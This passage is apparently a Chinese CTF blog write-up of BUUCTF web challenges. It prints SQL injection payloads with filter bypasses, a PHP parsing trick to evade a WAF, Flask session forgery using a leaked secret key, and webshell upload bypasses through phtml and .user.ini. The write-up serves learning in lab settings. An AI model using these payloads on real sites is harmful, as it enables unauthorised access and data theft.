{"title":"BUU刷题2020-10-12-18","uid":"683add4f9a49dbf4bd3c49ba47208ffa","slug":"BUU刷题2020-10-12-18","date":"2020-10-13T10:28:01.000Z","updated":"2021-06-28T14:57:34.348Z","comments":true,"path":"api/articles/BUU刷题2020-10-12-18.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h2><p>考点：SQL注入</p>\n<p>试了一下，在password处构造万能密码登陆</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20or%201&#x3D;1%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013185302.png\" alt=\"1\"></p>\n<p>得到了一个密码是:e9c198783c60914b393c747872a2fa52，这好像没有什么用.</p>\n<p>使用order by判断列数为3,表名有geekuser,l0ve1ysq1，列名有id,username,password</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">payload:&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20union%20select%201,2,group_concat(password)%20from%20l0ve1ysq1%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013185336.png\" alt=\"flag\"></p>\n<p>常规sql注入题目</p>\n<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>考点：PHP解析特性</p>\n<p>查看一下源码写了，这里的js可以看一下,这里他说他设置了waf看来是有做一些过滤</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token constant\">I</span>'ve <span class=\"token keyword\">set</span> up <span class=\"token constant\">WAF</span> to ensure security<span class=\"token punctuation\">.</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>\n    <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#calc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n            url<span class=\"token operator\">:</span><span class=\"token string\">\"calc.php?num=\"</span><span class=\"token operator\">+</span><span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#content\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            type<span class=\"token operator\">:</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div class=\"alert alert-success\">\n            &lt;strong>答案:&lt;/strong></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>data<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\n            &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function-variable function\">error</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"这啥?算不来!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里失去把输入的内容做url编码然后转到calc.php做处理,直接访问一下calc.php看看是什么。好家伙给了源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\['</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\]'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\$'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\^'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you want to do?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'echo '</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这题你要你的num里面出现了字母就会回显forbidden。这里的绕过方式是利用了PHP的字符串解析特性，查询字符串在解析的过程中会将某些字符删除或用下划线替代。在解析查询字符串时，会删除空白符，然后把某些字符转换为下划线(包括空格)。这里就是用来一个删除空白符来做的。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">? num&#x3D;phpinfo()\n#num前面加上一个空格，waf就找不到num这个变量了，我用用的变量叫做&#39; num&#39;，但是在PHP解析的时候会去掉一开始的空格，这样就绕过来限制了。在字母被过滤的时候很好用。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里有个坑点，一开始还以为这个源码就是waf了，结果事情并没有这么简单。习惯看一下disable_function，看来system是用不了了，那就要用scandir()来读目录。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/13/0hX1Wn.png\" alt=\"0hX1Wn.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/13/0hX3zq.png\" alt=\"0hX3zq.png\"></p>\n<p>发现f1agg,利用file_get_contents去读文件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;node3.buuoj.cn:28978&#x2F;calc.php?%20num&#x3D;file_get_contents(chr(47).f1agg)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到flag：flag{8d8d4704-4ec0-4185-be86-6e6903a1f8c2}</p>\n<h2 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h2><p>考点：签到题</p>\n<p>上来就要让连接shell,直接到/目录下读取flag文件得到flag,看起来应该是签到题。</p>\n<h2 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h2><p>考点：HTTP头部信息修改</p>\n<p>查看源代码，看到了Secret.php，访问一下。要做一个Referer</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: https:&#x2F;&#x2F;www.Sycsecret.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来就是改UA为Syclover,还要求要本地，那就再上一个xxf,拿到flag</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/13/0hXyy6.png\" alt=\"0hXyy6.png\"> </p>\n<h2 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h2><p>考点：flask的seesion伪造</p>\n<p>登陆页面直接试了一下admin、123就直接登陆成功了，但是这题应该还有别的做法吧，这应该还是非预期了。</p>\n<p>常规来做先注册一个用户，登陆一下注册的账号，提示不是admin。看看各个功能界面有什么东西没有。</p>\n<p>在/chage下看到了一个github项目，是这个题目的源码吧，把它载到本地来看看写了啥。这是用flask写的，看看他的路由有哪些，主要就是/code，/index,/register,/login,/logout,/change,/edit</p>\n<p>其中在index.php中告诉我们如果seesion[‘name’] = admin就可以得到flag</p>\n<p>用一个叫flask-unsign的工具来做flask-session的解码。得到如下结果</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/13/0hXLTg.png\" alt=\"0hXLTg.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&#39;_fresh&#39;: False, &#39;_id&#39;: b&#39;8413ea966585371366a3f87be9b31999c5d2c0351bfe38dd3b2b5b20f1e14e51f6df4e660ddd208689c3b22a79d9556dc0240b3a147b6c48ba10ad8761f5706e&#39;, &#39;csrf_token&#39;: b&#39;4725e6dae35c5e33960eec0c786f1c486a6c9198&#39;, &#39;image&#39;: b&#39;MFYe&#39;, &#39;name&#39;: &#39;alan&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>把name改为admin</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    SECRET_KEY <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token string\">'ckj123'</span>\n    SQLALCHEMY_DATABASE_URI <span class=\"token operator\">=</span> <span class=\"token string\">'mysql+pymysql://root:adsl1234@db:3306/test'</span>\n    SQLALCHEMY_TRACK_MODIFICATIONS <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>secret_key就是ckj123,</p>\n<p>使用工具生成新的session</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">a1andns@a1andns-PC:~/Software/CTF Tools$ python3 flask-unsign --sign --cookie <span class=\"token string\">\"&#123;'_fresh': False, '_id': b'8413ea966585371366a3f87be9b31999c5d2c0351bfe38dd3b2b5b20f1e14e51f6df4e660ddd208689c3b22a79d9556dc0240b3a147b6c48ba10ad8761f5706e', 'csrf_token': b'4725e6dae35c5e33960eec0c786f1c486a6c9198', 'image': b'MFYe', 'name': 'admin', 'user_id': '10'&#125;\"</span> --secret <span class=\"token string\">\"ckj123\"</span>\n.eJw9kMFqwzAQRH-l7DmHWG0ugRxiVJsUdkWKZCNdgus4tmQrhbgltkL-vSKFnGd4b2dvcDhdmrGD9akaxmYBB3uE9Q1evmANgu8nZEUnpGYk2wRDPWHQTEvygh-tkYPF8L4ScnBU7mcdtoFkZo1XQeSfPbLdrF1h0aUeSzVRrhIsNTO5XprIxNgxfHcVXL-JMpJd7Mt6ZXifkDR95M3EU4vsfaLoI49LkX90KNPO8PaVXOZJ1lfyagP3BdTj5XT4-e6b83MC8XqmUkVlNmAo4pkqYOijuhh0SB2FlhmXOeJtnGWckHHOdvPAWV-1zZMklTFm_5-cKx8DqI7enmEBv2NzefwNkiXc_wAus23Q.X4WlCw.EKY9v7m9KmlP5Rx_RCtWR1VL9OI<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/13/0hXvfs.png\" alt=\"0hXvfs.png\"></p>\n<p>得到flag</p>\n<h2 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h2><p>考点：sql注入+重写绕过</p>\n<p>经过尝试，这次对*,or，by,where,union,select等关键字做了过滤,不过经过尝试，发现是把敏感字符替换为空，所以重写绕过就好了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?username&#x3D;admin&amp;password&#x3D;1%27+oorrder+bbyy+3%23\n列数为3\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema&#x3D;database()%23\n#表名b4bsql,geekuser\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name&#x3D;&#39;b4bsql&#39;%23\n#列名id,username,password\n爆数据password\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(passwoorrd)+frfromom+b4bsql%23\n得到flag\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201014203248.png\" alt=\"1\"></p>\n<h2 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h2><p>考点：文件上传绕过，phtml绕过后缀</p>\n<p>一个图片上传入口，先传一张图片看看，成功后只显示文件名，而不显示路径，但是一般应该就是upload下，试一下访问成功。下面开始穿马</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201014203309.png\" alt=\"2\"></p>\n<p>过滤php、php3、php4后缀，大小写绕不过去，内容过滤&lt;?</p>\n<p>所以用phtml后缀，加上script的写法，成功绕过，然后到根目录下找到/flag文件。</p>\n<h2 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h2><p>考点：备份文件泄漏，PHP整形和字符串比较</p>\n<p>看题目和提示就是要下载备份文件，试一下index.php.bak，得到源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Just num!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Try to find out source file!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的key要和str相等，但是key数字，其实只要让key=123就可以实现这个语句的判断通过了。</p>\n<p>传入key=123，得到flag：flag{89c53a10-3152-4a2f-8338-f0dea20a8a7e}</p>\n<h2 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h2><p>考点：文件上传绕过前端和后端</p>\n<p>上来先看一下源码，看到在form中有一个onsubmit=”return checkFile()”</p>\n<p>先把php文件改为jpg文件来绕过前端验证，然后该文件后缀为phtml绕过，php、php3、php4都被过滤。然后连接shell就可以去拿flag了，flag在/目录下</p>\n<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>考点：文件上传</p>\n<p>老规矩上传一张图片看看情况。图片上传后,居然是回显内容里&lt;?，看来又是过滤了&lt;?，直接上马吧。php显示后缀非法，但是奇怪的是只要是jpg后缀就说内容里有&lt;?，继续做。</p>\n<p>用script和jpg后缀是可以上传的，但是.htaccess被ban了，还好还可以用.user.ini</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201014203326.png\" alt=\"3\"></p>\n<p>上传一个<code>.user.ini</code>文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GIF89a\nauto_prepend_file&#x3D;1.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201014203340.png\" alt=\"4\"></p>\n<p>这样php文件在一开始就会包含1.jpg,所以jpg格式的马也可以得到执行。直接用蚁剑去连接uplaod/xxxxxx/index.php</p>\n<h2 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h2><p>考点：代码审计，PHP特征</p>\n<p>看了一下，看到两个页面，一个是index.php，另一个是pay.php。</p>\n<p>看一下pay.php，显示一段话</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">If you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!!\nOnly Cuit&#39;s students can buy the FLAG<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>查看一下网页前端代码，发现了php源码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n\t<span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>post money <span class=\"token keyword\">and</span> password<span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"password can't be number&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span> <span class=\"token operator\">==</span> <span class=\"token number\">404</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Password Right!&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>抓个包，要让自己变成cuiter就要把http头部cookie改为 user=1</p>\n<p>然后构造一个password=404a,money=100000000,结果说数字太长了。这里可以用money[]=100000000来绕过，这样的话money会被当做一个array。另一种做法money=1e9，这种是利用了计算机对科学计数法的使用。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201016190254.png\" alt=\"flag\"></p>\n<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><p>考点：md5(string,true)</p>\n<p>reponse头有提示</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Hint: <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'admin'</span> <span class=\"token keyword\">where</span> password<span class=\"token operator\">=</span>md5<span class=\"token punctuation\">(</span>$pass<span class=\"token punctuation\">,</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里学习了一下:<a href=\"https://blog.csdn.net/March97/article/details/81222922\">https://blog.csdn.net/March97/article/details/81222922</a></p>\n<p>sql在识别’1abs’这样的字符串会被当做整型，所以可以利用这一点来构造一个类似与</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">`</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'admin'</span> <span class=\"token keyword\">where</span> password<span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token operator\">or</span><span class=\"token string\">'6�]��!r,��b'</span><span class=\"token punctuation\">`</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里记录两个可以用的payload：ffifdyop、129581926211651571912466741651878684928</p>\n<p>这里md5生成的32位16进制码，每2位16进制作为一个原始二进制，也就是没2位16进制做一下ascii码的转换。</p>\n<p>类似的还有，需要写一个脚本来获取，由于hash的血崩效应，这样我们基本就要遍历每一个可能的hash值才能找到我们需要的，这意味着要耗费极其大量的时间。我们需要有276f7227+（31-39）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（31-39）xxxxxx</p>\n<p>成功使用payload的过关后，跳转到一个新的关卡，显示 Do you like md5, 接着看一下源代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// wow, glzjin wants a girl friend.</span>\n<span class=\"token 